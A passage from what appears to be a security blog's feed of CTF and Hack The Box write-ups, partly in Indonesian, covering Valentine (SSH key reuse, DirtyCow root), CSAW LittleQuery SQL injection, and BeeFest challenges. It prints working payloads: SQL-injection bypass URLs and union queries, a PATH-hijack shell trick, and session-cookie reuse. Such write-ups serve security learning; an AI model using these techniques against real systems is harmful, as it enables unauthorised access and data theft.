-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;•% ➜ ssh-keygen -y -f hype_key
-Enter passphrase:
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDUU3iZcDCfeCCIML834Fx2YQF/TIyXoi6VI6S/1Z9SsZM9NShwUdRr3mPJocWOZ7RzuEbpRFZL1zgkykHfn8pR0Wc6kjQw4lCVGV237iqWlG+MSGRVOPuDS1Uma
-N3dN6bLL541LNpTscE4RbNzPhP6pD5pKsSX7IcMsAfyZ9rpfZKuciS0LXpbTS6kokrru6/MM1u3DkcfxuSW8HeO6lWQ7sbCMLbCp9WjKmBRlxMY4Jj0tUsz8f66vGaHxWiaUzBFy5m82qfCyL9N4Yro1xe1RF8uC5
-8i8rE/baDzW2GMK7JVcAvPiunu2J0QeWg8sVOytLLxPVxPrPKDb7CBEkzN
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;and i got &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh-rsa&lt;/code&gt; but the missing information here is who is the user of this ssh key ?
-and i just trying every possibilies username &lt;code class=&quot;highlighter-rouge&quot;&gt;admin,root,heart,bleed,hype,coffe,research,dev&lt;/code&gt; i try all of those and just getting the shell with &lt;code class=&quot;highlighter-rouge&quot;&gt;hype&lt;/code&gt; username&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;•% ➜ ssh hype@10.10.10.79 -i hype_key
-Enter passphrase for key 'hype_key':
-Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com/
-
-New release '14.04.5 LTS' available.
-Run 'do-release-upgrade' to upgrade to it.
-
-Last login: Fri Feb 16 14:16:34 2018 from 10.10.14.3
-hype@Valentine:~$ ls -la Desktop/
-total 12
-drwxr-xr-x  2 hype hype 4096 Dec 13 11:11 .
-drwxr-xr-x 21 hype hype 4096 Feb  5 16:41 ..
--rw-rw-r--  1 hype hype   33 Dec 13 16:54 user.txt
-hype@Valentine:~$ cat ~/Desktop/user.txt
-e6710a5464[REDACTED]6e076961750
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;after logged in to ssh we found user txt in Desktop folder&lt;/p&gt;
-
-&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
-
-&lt;p&gt;We need to get information from this system like the permission file/folder
-or Binary SUID and Check the Kernel if there was local exploit in wild.&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;uname -a =&amp;gt; Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;the kernel look like old enough and this kernel would have local exploit released&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;running linux exploit suggester&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  #############################
-    Linux Exploit Suggester 2
-  #############################
-
-  Local Kernel: 3.2.0
-  Searching among 70 exploits...
-
-  Possible Exploits:
-[+] dirty_cow
-     CVE-2016-5195
-     Source: https://www.exploit-db.com/exploits/40616/
-[+] msr
-     CVE-2013-0268
-     Source: http://www.exploit-db.com/exploits/27297/
-[+] perf_swevent
-     CVE-2013-2094
-     Source: http://www.exploit-db.com/download/26131
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;I could get root by using dirtycow exploit &lt;code class=&quot;highlighter-rouge&quot;&gt;CVE-2016-5195&lt;/code&gt; :D&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-hype@Valentine:~/Pictures$ ./cowroot
-DirtyCow root privilege escalation
-Backing up /usr/bin/passwd.. to /tmp/bak
-Size of binary: 42824
-Racing, this may take a while..
-/usr/bin/passwd is overwritten
-Popping root shell.
-Don't forget to restore /tmp/bak
-thread stopped
-thread stopped
-root@Valentine:/home/hype/Pictures# id
-uid=0(root) gid=1000(hype) groups=0(root),24(cdrom),30(dip),46(plugdev),124(sambashare),1000(hype)
-root@Valentine:/home/hype/Pictures# cat /root/root.txt
-f1bb6d759[REDACTED]bc9ed7765b2
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-
-  
-  &lt;p&gt;&lt;a href=&quot;http://localhost:4000/hackthebox/writeup-hackthebox-valentine&quot;&gt;Writeup Hackthebox - Valentine&lt;/a&gt; was originally published by Abdillah Muhamad at &lt;a href=&quot;http://localhost:4000&quot;&gt;@abdilahrf&lt;/a&gt; on March 09, 2018.&lt;/p&gt;</content>
-</entry>
-
-
-
-<entry>
-  <title type="html"><![CDATA[CSAW CTF 2017: LittleQuery - 200]]></title>
-  <link rel="alternate" type="text/html" href="http://localhost:4000/ctf/writeup-csaw2017-littlequery"/>
-  <id>http://localhost:4000/ctf/writeup-csaw2017-littlequery</id>
-  <published>2017-09-18T00:00:00+07:00</published>
-  <updated>2017-09-18T00:00:00-00:00</updated>
-  
-  <author>
-    <name>Abdillah Muhamad</name>
-    <uri>http://localhost:4000</uri>
-    <email>hasny1337@gmail.com</email>
-  </author>
-  
-  
-  <category scheme="http://localhost:4000/tags/#csaw2017" term="csaw2017" />
-  
-  
-  
-  <category scheme="http://localhost:4000/tags/#Web%20Exploitation" term="Web Exploitation" />
-  
-  
-  <content type="html">
-  
-    &lt;h2 id=&quot;problems&quot;&gt;Problems&lt;/h2&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LittleQuery
-I've got a new website for BIG DATA analytics!
-
-http://littlequery.chal.csaw.io
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;poc&quot;&gt;POC&lt;/h2&gt;
-
-&lt;p&gt;Di source code pada halaman index kita bisa menemukan ada source yang di comment&lt;/p&gt;
-
-&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-&lt;span class=&quot;c&quot;&gt;&amp;lt;!--
-&amp;lt;div class=&quot;col-md-4&quot;&amp;gt;
-    &amp;lt;h2&amp;gt;For Developers&amp;lt;/h2&amp;gt;
-    &amp;lt;p&amp;gt;Check out our &amp;lt;a href=&quot;/api/db_explore.php&quot;&amp;gt;API&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;
-&amp;lt;/div&amp;gt;
---&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;kita bisa melakukan explore terhadap database mereka menggunakan api yang tersedia,
-ada 2 mode untuk mengexplor databasenya yaitu &lt;code class=&quot;highlighter-rouge&quot;&gt;mode={schema|preview}&lt;/code&gt; schema untuk melihat schema dari
-table atau database.&lt;/p&gt;
-
-&lt;p&gt;so kita gunakan schema &lt;code class=&quot;highlighter-rouge&quot;&gt;http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema&lt;/code&gt; untuk melakukan
-list available databases ditemukan ada database namanya &lt;code class=&quot;highlighter-rouge&quot;&gt;littlequery&lt;/code&gt;, kemudian list table apa saja yang 
-ada pada database littlequery &lt;code class=&quot;highlighter-rouge&quot;&gt;http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema&amp;amp;db=littlequery&lt;/code&gt;
-so kita dapat ada table &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;nl&quot;&gt;tables&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
-        &lt;span class=&quot;s2&quot;&gt;&quot;user&quot;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;kemudian untuk melakukan list kolom pada table user gunakan &lt;code class=&quot;highlighter-rouge&quot;&gt;http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema&amp;amp;db=littlequery&amp;amp;table=user&lt;/code&gt;
-dan di dapatkan&lt;/p&gt;
-
-&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;nl&quot;&gt;columns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;nl&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;int(11)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-        &lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;varchar(128)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-        &lt;span class=&quot;nx&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;varchar(40)&quot;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;untuk melakukan dump datanya kita bisa gunakan mode preview ke &lt;code class=&quot;highlighter-rouge&quot;&gt;http://littlequery.chal.csaw.io/api/db_explore.php?mode=preview&amp;amp;db=littlequery&amp;amp;table=user&lt;/code&gt;
-tapi ternyata ada filter yang melarang untuk melakukan preview terhadap database &lt;code class=&quot;highlighter-rouge&quot;&gt;littlequery&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;setelah mencoba menlakukan injek terhadap parameter db dan table kita bisa memanipulasi parameter db sehingga
-tidak match dengan == “littlequery” kita bisa menggunakan # sebagai comment&lt;/p&gt;
-
-&lt;p&gt;illustrasi kodingan yang digunakan adalah sebagai berikut&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-&lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;addslashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'db'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$table&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;addslashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'table'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;littlequery&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Deny&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SELECT * from `&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;`.&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$table&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;`&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;kita bisa melakukan bypass dengan menggunakan payload sebagai berikut:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://littlequery.chal.csaw.io/api/db_explore.php?mode=preview&amp;amp;db=littlequery`.`user`%23&amp;amp;table=foobar`
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;$query akan jadi seperti berikut&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-&lt;span class=&quot;nx&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`littlequery`&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`user`&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#`.`foobar`&lt;/span&gt;
-
-&lt;span class=&quot;c1&quot;&gt;//query yang tereksekusi adalah =&amp;gt; SELECT * from `littlequery`.`user`&lt;/span&gt;
-
-&lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;littlequery`.`user`#&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// jadi kita gak kena deny lagi&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;didapatkan user dan password yang di hash&lt;/p&gt;
-
-&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;na&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-        &lt;span class=&quot;na&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;admin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-        &lt;span class=&quot;na&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;5896e92d38ee883cc09ad6f88df4934f6b074cf8&quot;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;kita tidak harus mencari plain-text dari SHA-1 tersebut karena website tersebut menerima login dengan
-hashed password bukan dengan plaintext password diketahui dari script yang ada di login.js&lt;/p&gt;
-
-&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;.form-signin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;$password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;input[type=password]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;nx&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CryptoJS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SHA1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;kita bisa kirim POST data dengan curl &lt;code class=&quot;highlighter-rouge&quot;&gt;curl -X POST http://littlequery.chal.csaw.io/login.php --data &quot;username=admin&amp;amp;password=5896e92d38ee883cc09ad6f88df4934f6b074cf8&quot; -v&lt;/code&gt;
-ambil cookie yang di kirimkan response &lt;code class=&quot;highlighter-rouge&quot;&gt;Set-Cookie: PHPSESSID=6cidmmh[...]cd63qr9nhgb7; path=/&lt;/code&gt; kemudian
-set cookie ke browser kalian untuk berpindah ke state login dan bisa akses ke &lt;code class=&quot;highlighter-rouge&quot;&gt;/query.php&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;di temukan flag &lt;code class=&quot;highlighter-rouge&quot;&gt;flag{mayb3_1ts_t1m3_4_real_real_escape_string?}&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://cdn.pbrd.co/images/GKSIR6m.png&quot; alt=&quot;Flag&quot; /&gt;&lt;/p&gt;
-
-  
-  &lt;p&gt;&lt;a href=&quot;http://localhost:4000/ctf/writeup-csaw2017-littlequery&quot;&gt;CSAW CTF 2017: LittleQuery - 200&lt;/a&gt; was originally published by Abdillah Muhamad at &lt;a href=&quot;http://localhost:4000&quot;&gt;@abdilahrf&lt;/a&gt; on September 18, 2017.&lt;/p&gt;</content>
-</entry>
-
-
-
-<entry>
-  <title type="html"><![CDATA[BeeFest CTF 2017: Writeups]]></title>
-  <link rel="alternate" type="text/html" href="http://localhost:4000/ctf/writeup-final-beefest-2017.1"/>
-  <id>http://localhost:4000/ctf/writeup-final-beefest-2017.1</id>
-  <published>2017-08-21T00:00:00+07:00</published>
-  <updated>2017-08-21T00:00:00-00:00</updated>
-  
-  <author>
-    <name>Abdillah Muhamad</name>
-    <uri>http://localhost:4000</uri>
-    <email>hasny1337@gmail.com</email>
-  </author>
-  
-  
-  <category scheme="http://localhost:4000/tags/#CTF" term="CTF" />
-  
-  
-  <content type="html">
-  
-    &lt;h2 id=&quot;logic&quot;&gt;Logic&lt;/h2&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh 10.22.130.222:22
-username : user1
-pass : user1
-read source code di /home/binex1/binex1.cpp 
-binary ada di /home/binex1/binex1
-Hint : System Variable
-Hint : Use $PATH Environment
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;poc&quot;&gt;POC&lt;/h2&gt;
-
-&lt;p&gt;kita bisa manfaatin $PATH Environment untuk mengelabui program binex1.cpp yang memanggil 
-&lt;code class=&quot;highlighter-rouge&quot;&gt;system(&quot;id&quot;)&lt;/code&gt; dia bakal pake binary id yang ada di $PATH &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/id&lt;/code&gt; karena kita punya kendai terhadap
-$PATH kita bisa bikin folder baru di &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; misalnya &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/fakebin&lt;/code&gt; terus kita bikin binary &lt;code class=&quot;highlighter-rouge&quot;&gt;id&lt;/code&gt; 
-yang nge-link ke &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; dengan command &lt;code class=&quot;highlighter-rouge&quot;&gt;ln -s /bin/sh /tmp/fakebin/id&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;kemudian kita tinggal modifikasi $PATH nya dengan &lt;code class=&quot;highlighter-rouge&quot;&gt;export PATH=/tmp/fakebin&lt;/code&gt; kemudian
-balik ke &lt;code class=&quot;highlighter-rouge&quot;&gt;cd /home/binex1/&lt;/code&gt; jalanin binary &lt;code class=&quot;highlighter-rouge&quot;&gt;./binex1&lt;/code&gt; nanti &lt;code class=&quot;highlighter-rouge&quot;&gt;system(&quot;id&quot;)&lt;/code&gt; akan manggil
-&lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/fakebin/id&lt;/code&gt; yang akan ngetrigger &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; dan kita bisa baca flagnya dengan &lt;code class=&quot;highlighter-rouge&quot;&gt;cat flag.txt&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Flag: &lt;strong&gt;CTFS{Abuse_the_system!!!}&lt;/strong&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;overflow&quot;&gt;Overflow&lt;/h2&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;overflow
-ssh 10.22.130.222:22
-username : user2
-pass : user2
-file binary ada di /home/binex2/binex2
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;poc-1&quot;&gt;POC&lt;/h2&gt;
-
-&lt;p&gt;binary bisa di download menggunakan scp atau semacamnya. setelah di download binarnya
-lakukan decompile menggunakan IDA Pro harusnya terlihat ada fungsi yang membandingkan apakah
-secret nya udah ter-overflow dengan hex “0xc0deface”&lt;/p&gt;
-
-&lt;p&gt;ketika kondisinya sudah terpenuhi maka &lt;code class=&quot;highlighter-rouge&quot;&gt;system(&quot;cat flag.txt&quot;)&lt;/code&gt; akan ter trigger.&lt;/p&gt;
-
-&lt;p&gt;Flag: &lt;strong&gt;CTFS{w00t_the_flag_is_showing}&lt;/strong&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;php-is-php&quot;&gt;php is PHP&lt;/h2&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Read and pwn get the flag!
-
-http://10.22.130.222/phpisPHP/
-
-Hint: PHP Banyak bug :)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;diberikan website yang meminta inputan flag :) dan source codenya.&lt;/p&gt;
-
-&lt;h2 id=&quot;poc-2&quot;&gt;POC&lt;/h2&gt;
-
-&lt;p&gt;untuk solve soal ini sebenenarnya kita hanya perlu mengirimkan request field name nya 
-dalam bentuk array untuk membypass validasi dengan &lt;code class=&quot;highlighter-rouge&quot;&gt;strcasecmp&lt;/code&gt; pada source code ada beberapa
-code sebagai pengecoh ;) &lt;code class=&quot;highlighter-rouge&quot;&gt;strcasecmp&lt;/code&gt; adalah fungsi tetangga nya dari &lt;code class=&quot;highlighter-rouge&quot;&gt;strcmp&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Flag: &lt;strong&gt;CTFS{remember_strcasecmp_is_another_strcmp_h3h3}&lt;/strong&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;injectme&quot;&gt;Injectme&lt;/h2&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Banyak yang di blackLIST!
-
-
-http://10.22.130.222/injectme/
-
- 
-
-Hint : username untuk login di filter dengan fungsi secure dibawah
-
-
-function secure($data) {
-    if (preg_match(&quot;/username|USERNAME|password|PASSWORD|union|select|UNION|SELECT|from|FROM|sleep|id|ID|SLEEP|ascii|hex|ASCII|HEX|binary|BINARY|chr|CHR| /&quot;, $data)) {
-        $bl = &quot;username|USERNAME|password|PASSWORD|union|select|UNION|SELECT|from|FROM|sleep|id|ID|SLEEP|ascii|hex|ASCII|HEX|binary|BINARY|chr|CHR&quot;;
-        $bl = explode(&quot;|&quot;, $bl);
-        foreach ($bl as $b) {
-            if (strstr($data, $b)) {
-                echo $b . &quot; is blaklisted 
-&quot;;
-            }
-        }
-        die(&quot;You cant use input blacklisted&quot;);
-    }
-    return $data;
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;poc-3&quot;&gt;POC&lt;/h2&gt;
-
-&lt;p&gt;Kita bisa mendapatkan flag dengan menggunakan union based, filter yang di gunakan pada
-fungsi secure masih sangat longgar dan bisa di bypass karena preg_match yang digunakan
-hanya mengecek &lt;code class=&quot;highlighter-rouge&quot;&gt;select&lt;/code&gt; dan &lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT&lt;/code&gt; kita bisa menggunakan &lt;code class=&quot;highlighter-rouge&quot;&gt;seLect&lt;/code&gt; sebagai bypass, begitu
-juga dengan keyword yang lainnya.&lt;/p&gt;
-
-&lt;p&gt;pada fungsi secure juga “ “ (spasi) di blacklist, kita bisa ganti menggunakan &lt;code class=&quot;highlighter-rouge&quot;&gt;/**/&lt;/code&gt; sebgagai
-pengganti spasi&lt;/p&gt;
-
-&lt;p&gt;kurang lebih payload yang work sebagai berikut &lt;code class=&quot;highlighter-rouge&quot;&gt;'/**/unIon/**/seLect/**/1,(seLect/**/pasSword/**/fRom/**/users)#&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Flag : &lt;strong&gt;CTFS{tHi$_p4zZw0rd_h4rD_en0ugH}&lt;/strong&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;basic&quot;&gt;Basic&lt;/h2&gt;
-
-&lt;p&gt;Diberikan flag yang di encode BASE32&lt;/p&gt;
-
-&lt;h2 id=&quot;poc-4&quot;&gt;POC&lt;/h2&gt;
-
